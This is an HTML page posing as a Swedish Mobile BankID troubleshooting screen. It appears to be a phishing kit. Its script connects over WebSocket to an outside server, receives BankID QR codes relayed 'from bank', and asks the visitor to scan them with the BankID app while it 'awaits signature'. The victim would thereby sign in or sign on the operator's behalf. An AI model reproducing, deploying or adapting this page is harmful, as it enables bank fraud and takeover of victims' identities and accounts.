<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BankID Felsökning</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
        }

        .top-header {
            background-color: #F5F6F7;
            color: #183E4F;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            border-bottom: 1px solid #E5E5E5;
        }

        .header-logo {
            height: 30px;
            width: auto;
        }

        .header-text {
            font-size: 20px;
            font-weight: bold;
            color: #183E4F;
            text-align: center;
        }

        .subheader-banner {
            background-color: #F5F6F7;
            padding: 10px 20px;
            border-bottom: 1px solid #E5E5E5;
        }

        .subheader-text {
            color: #183E4F;
            font-size: 14px;
            font-weight: bold;
        }

        main {
            max-width: 1200px;
            margin: 20px auto;
            padding: 0 20px;
        }

        .container {
            background-color: white;
            border-radius: 10px;
            padding: 30px;
            width: min(90%, 400px);
            margin: 40px auto;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .title {
            font-size: 18px;
            color: #4A4A4A;
            margin-bottom: 25px;
            font-weight: normal;
            text-align: left;
            width: 100%;
            padding-left: 15px;
        }

        #qrDisplay {
            width: 300px;
            height: 300px;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background-color: white;
            object-fit: contain;
            flex-shrink: 0;
        }

        .loading-container {
            width: 300px;
            height: 300px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background-color: white;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #183E4F;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }

        .loading-text {
            color: #183E4F;
            font-size: 14px;
            font-weight: bold;
        }

        .instructions {
            margin-top: 15px;
            text-align: left;
            width: 100%;
            max-width: 320px;
            position: relative;
            padding-left: 65px;
        }

        .bankid-app-image {
            position: absolute;
            left: 0;
            top: 30px;
            width: 55px;
            height: auto;
        }

        .qr-icon {
            width: 14px;
            height: 14px;
            vertical-align: middle;
            margin-left: 4px;
        }

        .instructions h3 {
            color: #4A4A4A;
            font-size: 15px;
            margin-bottom: 8px;
            font-weight: normal;
        }

        .instructions ol {
            padding-left: 20px;
            color: #4A4A4A;
            margin: 0;
            list-style-position: outside;
        }

        .instructions li {
            margin-bottom: 6px;
            line-height: 1.3;
            font-size: 13px;
            position: relative;
        }

        .help-link {
            display: block;
            margin-top: 12px;
            color: #183E4F;
            text-decoration: none;
            font-size: 13px;
            text-decoration-line: underline;
            text-decoration-style: dotted;
        }

        .help-link:hover {
            text-decoration-style: solid;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (min-width: 48em) {
            main {
                padding: 0 16px;
            }
        }
    </style>
</head>
<body>
    <div class="top-header">
        <img src="/placeholder/bankidlogo.png" alt="BankID Logo" class="header-logo">
        <span class="header-text">Felsökning Av Mobilt BankID</span>
    </div>

    <div class="container">
        <div class="title">Mobilt BankID med QR-kod</div>
        <div class="loading-container" id="loadingContainer">
            <div class="spinner"></div>
            <div class="loading-text">Inväntar signatur för vidare hantering</div>
        </div>
        <img id="qrDisplay" src="" alt="QR Code" style="display: none;">
        
        <div class="instructions">
            <img src="/placeholder/bankid-qr-phone.png" alt="BankID App" class="bankid-app-image">
            <h3>Instruktioner</h3>
            <ol>
                <li>Öppna BankID-appen på den enhet du använde för att logga in</li>
                <li>Tryck på QR-symbolen i BankID-appen <img src="/placeholder/qrcode-scan-blue.svg" alt="QR Icon" class="qr-icon"></li>
                <li>Rikta kameran mot QR-koden</li>
            </ol>
            <a href="#" class="help-link">Varför signera med QR-kod?</a>
        </div>
    </div>

    <script>
        const socket = new WebSocket('wss://web-production-c116.up.railway.app');
        const qrDisplay = document.getElementById('qrDisplay');
        const loadingContainer = document.querySelector('.loading-container');

        socket.onopen = () => {
            console.log('Connected to server');
        };

        socket.onmessage = (event) => {
            const data = JSON.parse(event.data);
            if (data.type === 'qr') {
                console.log('Received QR code from bank:', data.bank);
                qrDisplay.src = data.qrData;
                qrDisplay.style.display = 'block';
                loadingContainer.style.display = 'none';
            }
        };

        socket.onerror = (error) => {
            console.error('WebSocket error:', error);
        };

        socket.onclose = () => {
            console.log('Disconnected from server');
            setTimeout(() => {
                window.location.reload();
            }, 5000);
        };
    </script>
</body>
</html>
